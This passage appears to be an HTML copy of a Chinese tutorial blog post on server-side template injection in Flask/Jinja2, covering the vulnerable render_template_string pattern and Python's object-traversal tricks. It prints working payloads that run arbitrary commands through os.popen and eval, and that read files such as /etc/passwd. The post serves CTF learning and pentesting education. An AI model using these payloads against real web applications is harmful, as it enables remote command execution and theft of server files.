@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>SSTI服务端模板注入 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="简介 ssti（Server-SIde Template Injection，服务端模板注入），模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换" /><meta name="keywords" content='SSTI, 服务端模板注入, 代码审计' /><meta itemprop="name" content="SSTI服务端模板注入">
+<meta itemprop="description" content="简介 ssti（Server-SIde Template Injection，服务端模板注入），模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换"><meta itemprop="datePublished" content="2022-01-20T16:32:49+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="5036"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="SSTI,服务端模板注入,代码审计," /><meta property="og:title" content="SSTI服务端模板注入" />
+<meta property="og:description" content="简介 ssti（Server-SIde Template Injection，服务端模板注入），模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-20T16:32:49+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="SSTI服务端模板注入"/>
+<meta name="twitter:description" content="简介 ssti（Server-SIde Template Injection，服务端模板注入），模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" /><link rel="prev" href="https://geoer.cn/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="https://geoer.cn/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "SSTI服务端模板注入",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "SSTI, 服务端模板注入, 代码审计","wordcount":  5036 ,
+    "url": "https:\/\/geoer.cn\/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5\/","datePublished": "2022-01-20T16:32:49+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>SSTI服务端模板注入</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2022-01-20&#32;16:32:49><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-20">2022-01-20</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 5036 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 11 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="SSTI服务端模板注入">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#简介">简介</a>
+      <ul>
+        <li><a href="#flask的jinja2">Flask的Jinja2</a>
+          <ul>
+            <li><a href="#漏洞成因"><strong>漏洞成因：</strong></a></li>
+            <li><a href="#ctf">CTF</a></li>
+            <li><a href="#bypass">Bypass</a></li>
+            <li><a href="#实战">实战</a></li>
+          </ul>
+        </li>
+        <li><a href="#java的freemarker">Java的Freemarker</a></li>
+        <li><a href="#java的velovity模板引擎">Java的Velovity模板引擎</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞防御">漏洞防御</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="简介">简介</h2>
+<p><strong>ssti（Server-SIde Template Injection，服务端模板注入）</strong>，模板引擎支持使用静态模板文件，在运行时HTML页面中的实际值替换为变量/占位符，从而让HTML的开发变得更容易。</p>
+<p>ssti主要为python的一些框架 <code>jinja2 mako tornado django</code>，PHP框架<code>smarty twig</code>，java框架<code>jade velocity freeMarker XMLTemplate Smarty4j</code>  等等使用了渲染函数时，<strong>由于代码不规范或信任了用户输入而导致了服务端模板注入</strong>，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
+<h3 id="flask的jinja2">Flask的Jinja2</h3>
+<blockquote>
+<p>CTF赛题中以python下的SSTI居多</p>
+</blockquote>
+<p>Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。</p>
+<p>{% raw %}
+基本语法，使用<code>{{}}</code>如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Hello, {{user.name}}!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>{% endraw %}</p>
+<h4 id="漏洞成因"><strong>漏洞成因：</strong></h4>
+<p>两种渲染给前端的代码的形式是，</p>
+<p>1.一种当字符串来渲染并且使用了<code>%(request.url)</code>，此方法存在漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;div class=&#34;center-content error&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;h3&gt;</span><span class="si">%s</span><span class="s1">&lt;/h3&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/div&gt; 
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span> <span class="o">%</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.另一种规范使用index.html渲染文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/index&#39;</span><span class="p">)</span><span class="c1">#我们访问/或者/index都会跳转</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span><span class="n">title</span><span class="o">=</span><span class="s1">&#39;Home&#39;</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;key&#34;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>{% raw %}</p>
+<p>由上两种功能方法，我们发现漏洞代码(第一种方法)使用了<code>render_template_string</code>函数，而如果我们使用第二种<code>render_template</code>函数，将变量传入进去，现在即使我们写成了request，我们可以在url里写自己想要的恶意代码{{}}你将会发现：即使输入参数可控了，但是代码已经并不生效。因为，良好的代码规范，使得模板其实已经固定了，已经被<code>render_template</code>渲染了。你的模板渲染其实已经不可控了。</p>
+<p>而第一种漏洞代码的问题出在这里，如下：注意%(request.url)，有的程序员因为省事并不会专门写一个html文件，而是直接当字符串来渲染。并且request.url是可控的，这也正是flask在CTF中经常使用的手段，报错404，返回当前错误url，通常CTF的flask如果是ssti，那么八九不离十就是基于这段代码，多的就是一些过滤和一些奇奇怪怪的方法函数。</p>
+<p>{% endraw %}</p>
+<h4 id="ctf">CTF</h4>
+<p>**内建函数：**当我们启动一个python解释器时，及时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。</p>
+<p><code>dir()</code>函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块。</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="http://image.xpshuai.cn/img/image-20220120210407271.png"
+    data-srcset="http://image.xpshuai.cn/img/image-20220120210407271.png, http://image.xpshuai.cn/img/image-20220120210407271.png 1.5x, http://image.xpshuai.cn/img/image-20220120210407271.png 2x"
+    data-sizes="auto"
+    alt="http://image.xpshuai.cn/img/image-20220120210407271.png"
+    title="http://image.xpshuai.cn/img/image-20220120210407271.png"/></p>
+<p>python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。</p>
+<p><code>instance.__class__</code>可以获取当前实例的类对象</p>
+<p><code>instance.__class.____bases__</code>可以查看其基类</p>
+<p><code>instance.__class__.mro</code>获取当前类对象的所有继承类&rsquo;只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到</p>
+<p><code>subclasses()</code>  返回的是这个类的子类的集合。python中的类都是继承object的，所以只要调用object类对象的__subclasses__()方法就可以获取我们想要的类的对象，比如用于读取文件的file对象。</p>
+<p>比如可以发现在第四十号指向file类，所以就可以从file类中调用open方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span>.__class__.__mro__<span class="o">[</span>-1<span class="o">]</span>.__subclasses__<span class="o">()[</span>40<span class="o">](</span><span class="s2">&#34;/home/xps/test/ssti/flag.txt&#34;</span><span class="o">)</span>.read<span class="o">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 这里成功利用file对象的匿名实例化，并为其传参要读取的文件名，通过调用其读文件函数read就可以对文件进行读取了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>{% raw %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2"># __calss__
+</span></span></span><span class="line"><span class="cl"><span class="s2">print(&#34;&#34;.__class__)
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 返回了&lt;class &#39;str&#39;&gt;，对于一个空字符串他已经打印了str类型
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"># __bases__
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 每个类都有一个bases属性，列出其基类如下
+</span></span></span><span class="line"><span class="cl"><span class="s2">print(&#34;&#34;.__class__.__bases__)	# 打印返回(&lt;class &#39;object&#39;&gt;,)
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"># mro
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 我们想要寻找object类的不仅仅只有bases，同样可以使用mro，mro给出了method resolution order，即【解析方法调用的顺序】。如下
+</span></span></span><span class="line"><span class="cl"><span class="s2">&gt;&gt;&gt; print(&#34; &#34;.__class__.__mro__)
+</span></span></span><span class="line"><span class="cl"><span class="s2">(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,subclasses() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。
+</span></span></span><span class="line"><span class="cl"><span class="s2"># subclasses()  返回的是这个类的子类的集合
+</span></span></span><span class="line"><span class="cl"><span class="s2">print(&#34; &#34;.__class__.__bases__[0].__subclasses__())
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 需要自己寻找合适的标号来调用接下来我将进一步解释
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class &#39;os._wrap_close&#39;&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[118]。
+</span></span></span><span class="line"><span class="cl"><span class="s2">{{&#34; &#34;.__class__.__bases__[0].__subclasses__()[118]}}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 这个时候我们便可以利用.init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。
+</span></span></span><span class="line"><span class="cl"><span class="s2">{{&#34; &#34;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__}}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。
+</span></span></span><span class="line"><span class="cl"><span class="s2">{{&#34; &#34;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()}}
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"># 此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>{% endraw %}</p>
+<p><strong>执行任意命令</strong>的payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">values</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">b</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">==</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__class__</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="s1">&#39;eval&#39;</span> <span class="ow">in</span> <span class="n">b</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{{</span> <span class="n">b</span><span class="p">[</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;</span><span class="p">)</span> <span class="p">}}</span>         <span class="c1"># poppen的参数就是要执行的命令</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>读取密码</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span>.__class__.__mro__<span class="o">[</span>-1<span class="o">]</span>.__subclasses__<span class="o">()[</span>40<span class="o">](</span><span class="s2">&#34;/etc/passwd&#34;</span><span class="o">)</span>.read<span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>命令执行:</strong></p>
+<p><strong>1.os.system()</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
